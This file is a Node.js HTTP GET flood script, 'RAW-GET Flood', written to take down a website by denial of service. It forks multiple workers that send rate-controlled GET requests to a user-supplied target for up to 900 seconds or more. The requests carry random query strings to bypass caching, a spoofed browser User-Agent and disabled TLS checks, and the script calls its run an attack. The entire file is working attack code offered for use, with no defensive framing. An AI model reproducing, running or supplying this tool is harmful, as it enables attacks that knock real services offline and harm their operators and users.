#!/usr/bin/env node

// RAW-GET Flood - Optimized for 4GB RAM & long durations (e.g., 900s)
// Usage: node raw-get.js <target> [time] [threads] [rate]

const http = require('http');
const https = require('https');
const url = require('url');
const cluster = require('cluster');

// Parse arguments with conservative defaults for low RAM
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]) || 60,          // default 60s, can go to 900+
    threads: parseInt(process.argv[4]) || 4,        // reduced for 4GB RAM
    rate: parseInt(process.argv[5]) || 200          // requests/sec per worker
};

if (!args.target) {
    console.error('Usage: node raw-get.js <target> [time] [threads] [rate]');
    process.exit(1);
}

const parsed = new URL(args.target);
const isHttps = parsed.protocol === 'https:';
const httpLib = isHttps ? https : http;

// Per-worker agent with capped sockets to prevent memory exhaustion
const createAgent = () => new httpLib.Agent({
    keepAlive: true,
    keepAliveMsecs: 10000,
    maxSockets: 256,           // limit concurrent connections per worker
    maxFreeSockets: 64,
    timeout: 30000,            // close idle sockets after 30s
    rejectUnauthorized: false
});

if (cluster.isMaster) {
    console.log(`\n🔥 RAW-GET (no proxy, low‑mem mode) | Target: ${args.target}`);
    console.log(`   Duration: ${args.time}s | Workers: ${args.threads} | Rate: ${args.rate} req/s/worker`);
    console.log(`   Expected total RPS: ${args.threads * args.rate} | RAM usage: ~${Math.round(args.threads * 50)} MB`);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => {
        console.log('\n⏹️  Attack finished, exiting...');
        process.exit(0);
    }, args.time * 1000 + 3000);
} else {
    let running = true;
    let requestCount = 0;
    const agent = createAgent();

    function sendRequest() {
        if (!running) return;
        const options = {
            hostname: parsed.hostname,
            port: parsed.port || (isHttps ? 443 : 80),
            path: parsed.pathname + (parsed.search ? parsed.search + '&' : '?') + Math.random(),
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml',
                'Connection': 'keep-alive'
            },
            agent: agent,
            rejectUnauthorized: false
        };
        const req = httpLib.request(options, (res) => {
            requestCount++;
            res.resume(); // consume data to free memory
        });
        req.on('error', () => {});
        req.end();
    }

    // Throttle requests to stay within rate limit
    const intervalMs = 1000 / args.rate;
    const intervalId = setInterval(() => sendRequest(), intervalMs);

    // Report RPS every second
    const reportInterval = setInterval(() => {
        if (!running) return;
        console.log(`Worker ${cluster.worker.id} RPS: ${requestCount}`);
        requestCount = 0;
    }, 1000);

    // Stop after duration
    setTimeout(() => {
        running = false;
        clearInterval(intervalId);
        clearInterval(reportInterval);
        agent.destroy(); // close all sockets
        setTimeout(() => process.exit(0), 500);
    }, args.time * 1000);
}
